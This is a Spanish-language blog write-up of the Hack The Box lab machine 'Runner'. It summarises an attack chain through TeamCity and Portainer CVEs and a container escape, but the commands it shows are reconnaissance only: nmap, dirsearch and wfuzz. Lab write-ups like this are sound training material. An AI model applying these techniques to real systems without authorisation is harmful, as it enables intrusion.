<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Runner - Hack The Box" />
<meta property="og:locale" content="en" />
<meta name="description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
<meta property="og:description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
<link rel="canonical" href="http://localhost:4000/posts/runner/" />
<meta property="og:url" content="http://localhost:4000/posts/runner/" />
<meta property="og:site_name" content="MrIncreibl3" />
<meta property="og:image" content="http://localhost:4000/assets/img/htb-writeup-runner/runner.png" />
<meta property="og:image:alt" content="runner" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-10-17T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/htb-writeup-runner/runner.png" />
<meta name="twitter:image:alt" content="runner" />
<meta property="twitter:title" content="Runner - Hack The Box" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-10-17T00:00:00+00:00","datePublished":"2025-10-17T00:00:00+00:00","description":"A minimal, responsive and feature-rich Jekyll theme for technical writing.","headline":"Runner - Hack The Box","image":{"alt":"runner","url":"http://localhost:4000/assets/img/htb-writeup-runner/runner.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/runner/"},"url":"http://localhost:4000/posts/runner/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Runner - Hack The Box | MrIncreibl3
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="MrIncreibl3">
<meta name="application-name" content="MrIncreibl3">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    
      <link rel="preconnect" href="https://cdnjs.cloudflare.com" >
      <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/logo.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">MrIncreibl3</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Pentester , CTF player  HackTheBox RedTeam</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/MrIncreible3"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['',''].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Runner - Hack The Box</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Runner - Hack The Box</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760659200"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Oct 17, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/htb-writeup-runner/runner.png" class="popup img-link preview-img shimmer"><img src="/assets/img/htb-writeup-runner/runner.png"  alt="runner" width="1200" height="630"  loading="lazy"></a><figcaption class="text-center pt-2 pb-2">runner</figcaption></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://github.com/MrIncreibl3">MrIncreibl3</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2706 words"
>
  <em>15 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p><a href="/assets/img/htb-writeup-runner/runner-logo.png" class="popup img-link right shimmer"><img src="/assets/img/htb-writeup-runner/runner-logo.png" alt="logo"  width="200" height="200" loading="lazy"></a></p>

<p>Runner es una máquina Linux de dificultad media que contiene una vulnerabilidad [CVE-2023-42793] en <code class="language-plaintext highlighter-rouge">TeamCity</code>. Esta vulnerabilidad permite a los usuarios eludir la autenticación y extraer un token API, que puede utilizarse para habilitar funciones de depuración para ejecutar comandos del sistema. Al obtener acceso a un contenedor Docker de <code class="language-plaintext highlighter-rouge">TeamCity</code> y comprimir los archivos de la base de datos <code class="language-plaintext highlighter-rouge">HSQLDB</code>, podemos extraer las credenciales del usuario <code class="language-plaintext highlighter-rouge">matthew</code> y encontrar una clave <code class="language-plaintext highlighter-rouge">SSH</code> para <code class="language-plaintext highlighter-rouge">john</code>. Después de descifrar la contraseña, podemos autenticarnos en el sistema de archivos del host. Al inspeccionar el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, descubrimos una instancia de <code class="language-plaintext highlighter-rouge">Portainer</code> en ejecución. Utilizando las credenciales de «matthew», accedemos al subdominio desde el exterior. Una vez autenticados, descubrimos que podemos crear imágenes, pero nuestros privilegios son limitados. Después de comprobar la versión en el host, explotamos una vulnerabilidad [CVE-2024-21626] a través de la función de creación de imágenes de <code class="language-plaintext highlighter-rouge">Portainer</code>, lo que nos permite crear un archivo bash SUID en el host</p>

<h2 id="reconocimiento"><span class="me-2">Reconocimiento</span><a href="#reconocimiento" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="nmap"><span class="me-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>En la parte inicial del reconocimiento vamos a iniciar con un escane de puertos basico</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T3</span> <span class="nt">-n</span> &lt;IP&gt;
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>-p-
    <ul>
      <li>Escanear todo el rango de puertos (65535)</li>
    </ul>
  </li>
  <li>–open
    <ul>
      <li>Reportar solo los puertos abiertos</li>
    </ul>
  </li>
  <li>-T3
    <ul>
      <li>Aumentar la velocidad de escaneo, existen desde T1 a T5</li>
    </ul>
  </li>
  <li>-n
    <ul>
      <li>Anular la resolucion DNS (No hacer resolución DNS) Ya que DNS es generalmente lento, esto acelera un poco las cosas</li>
    </ul>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>-&gt; Puertos Abiertos
-&gt; 22
-&gt; 80
-&gt; 8000
</pre></td></tr></tbody></table></code></div></div>

<h3 id="nmap-servicios-de-puertos"><span class="me-2">Nmap Servicios de Puertos</span><a href="#nmap-servicios-de-puertos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Posterior al escaneo de puertos vamos a identificar la version y servicio que corre en cada uno y vamos a guardarlo como archivo de documentacion <code class="language-plaintext highlighter-rouge">ports</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p22</span>,80,8000 <span class="nt">-sCV</span> &lt;IP&gt; <span class="nt">-oN</span> ports
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http        nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Runner - CI/CD Specialists
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn<span class="s1">'t have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="web"><span class="me-2">Web</span><a href="#web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>La web nos redirige a runner.htb, este seria el dominio de la pagina</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'&lt;IP&gt; runner.htb'</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></td></tr></tbody></table></code></div></div>

<p>De esta manera vamos a incorporarlo a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> donde a la hora de visitar la web nos va a resolver correctamente</p>

<p><a href="/assets/img/htb-writeup-runner/runner1.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner1.png" alt="" loading="lazy"></a></p>

<p>Como se muestra en la imagen, esta web solo es estatica y no presenta botones con funcionalidades web como registrarse o loguearse, etc. Voy a probar buscando archivos lekeados con dirsearch</p>

<h3 id="enumeracion-web-fuzz"><span class="me-2">Enumeracion Web Fuzz</span><a href="#enumeracion-web-fuzz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-ruby highlighter-rouge"><div class="code-header">
        <span data-label-text="Ruby"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="n">dirsearch</span> <span class="o">--</span><span class="n">url</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">runner</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">t</span> <span class="mi">50</span>     
<span class="n">_</span><span class="o">|</span><span class="p">.</span> <span class="nf">_</span> <span class="n">_</span>  <span class="n">_</span>  <span class="n">_</span>  <span class="n">_</span> <span class="n">_</span><span class="o">|</span><span class="n">_</span>    <span class="n">v0</span><span class="o">.</span><span class="mf">4.3</span>
 <span class="p">(</span><span class="n">_</span><span class="o">|||</span> <span class="n">_</span><span class="p">)</span> <span class="p">(</span><span class="sr">/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /</span><span class="n">home</span><span class="o">/</span><span class="n">mrincreible</span><span class="o">/</span><span class="no">HTB</span><span class="o">/</span><span class="n">runner</span><span class="o">/</span><span class="n">reports</span><span class="o">/</span><span class="n">http_runner</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span><span class="n">__24</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">28_14</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">52</span><span class="p">.</span><span class="nf">txt</span>

<span class="no">Target</span><span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">runner</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span>

<span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mi">52</span><span class="p">]</span> <span class="no">Starting</span><span class="p">:</span>                                                                                                                                                       
<span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">18</span><span class="p">]</span> <span class="mi">301</span> <span class="o">-</span>  <span class="mi">178</span><span class="no">B</span>  <span class="o">-</span> <span class="sr">/assets  -&gt;  http:/</span><span class="o">/</span><span class="n">runner</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span>            
<span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">18</span><span class="p">]</span> <span class="mi">403</span> <span class="o">-</span>  <span class="mi">564</span><span class="no">B</span>  <span class="o">-</span> <span class="sr">/assets/</span>
</pre></td></tr></tbody></table></code></div></div>

<p>No encontramos nada relevante en esta parte de fuzzear por archivos o templates de la web, asi que vamos a seguir con la enumeracion de subdominios con wfuzz. Es importante tener una buena metodologia a la hora de enumerar aplicaciones web.</p>

<h3 id="enumeracion-web-fuzz-domain"><span class="me-2">Enumeracion Web Fuzz Domain</span><a href="#enumeracion-web-fuzz-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>154 <span class="nt">-t</span> 100 <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt <span class="nt">-H</span> <span class="s1">'Host: FUZZ.runner.htb'</span> http://runner.htb
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>
Target: http://runner.htb/
Total requests: 100000
<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload     
<span class="o">=====================================================================</span>
000013170:   401        1 L      9 W        66 Ch       <span class="s2">"teamcity"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Agregare este subdominio al /etc/hosts</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'&lt;IP&gt; runner.htb teamcity.runner.htb'</span> <span class="o">&gt;&gt;</span> /etc/hosts 
</pre></td></tr></tbody></table></code></div></div>

<p>nos redirige a <code class="language-plaintext highlighter-rouge">http://teamcity.runner.htb/login.html</code></p>

